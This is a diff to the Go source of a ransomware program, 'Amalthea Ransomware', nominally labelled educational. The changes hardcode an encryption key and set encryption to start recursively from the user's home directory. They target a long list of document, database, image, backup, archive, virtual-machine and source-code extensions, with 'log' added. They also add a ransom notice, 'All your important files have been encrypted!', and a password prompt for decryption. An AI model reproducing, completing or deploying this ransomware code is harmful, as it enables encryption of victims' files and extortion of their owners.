@@ -34,8 +34,8 @@ func main() {
 	// 32 Bit Encryption Password.
 	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
 	/*
-		Only encrypt files and folders in this directory & subdirectories.
-		TODO: Update File discovery to exclude SYSTEM owned files.
+		This is the root directory where the encryption
+		should recursively start. `AppData` is excluded.
 	*/
 	rootDir := userHomeDir() + "\\"
 	// Art Banner
@@ -52,21 +52,22 @@ func main() {
 
 	`)
 	// Subheading
-	sub := color.Cyan.Sprint("Amalthea Ransomware")
+	sub := color.Cyan.Sprint("Amalthea Ransomware.")
 	// Warning
-	warn := color.Yellow.Sprint("For educational and research purposes only.")
-	// Password Prompt
-	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
+	warn := color.Yellow.Sprint("For educational and research purposes only.\n")
+	// Password Prompt & notice
+	decrypt := color.Magenta.Sprint("All your important files have been encrypted!")
+	message := color.Magenta.Sprint("Enter decryption password to get your files back:")
 	// Decrypted Files Array:
-	decryptFiles := color.Green.Sprint("The above files have been decrypted")
-	// Only Encrypt these file extensions.
+	decryptFiles := color.Green.Sprint("\nThe files below have been decrypted")
+	// Only encrypt files with these file extensions.
 	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
 		"7z", "rar", "zip", "backup", "bin", "bac", "iso", "vcd", "bmp", "png", "gif", "raw",
 		"accdb", "sql", "sqlitedb", "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg",
 		"cgm", "tif", "tiff", "nef", "psd", "ai", "svg", "djvu", "m4u", "m3u",
 		"csv", "rtf", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt",
-		"doc", "docx", "xls", "xlsx", "ppt", "dat",
+		"doc", "docx", "xls", "xlsx", "ppt", "dat", "log",
 		"gpg", "aes", "arc", "paq", "bz2", "tbk", "bak", "bac", "tar", "tgz", "gz",
 		"hwp", "62", "sxi", "sti", "sldx", "sldm", "vdi", "vmdk", "vmx",
 		"jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl",
@@ -109,6 +110,7 @@ func main() {
 	color.Warn.Println(warn)
 	// Prompt user for password to decrypt
 	color.Warn.Println(decrypt)
+	color.Warn.Println(message)
 
 	var password string
 	fmt.Scanln(&password)
@@ -122,9 +124,9 @@ func main() {
 			// Decrypts files if password is correct.
 			enc := encryption.NewEncryption(file, key)
 			enc.DecryptFile()
-			color.Println(decryptFiles)
 		}
-		fmt.Println(encryptedfiles)
+		color.Println(decryptFiles)
+		color.Println(encryptedfiles)
 		// Print an error if decryption fails.
 	} else {
 		fmt.Println("Decryption Failed. Is the password correct?")
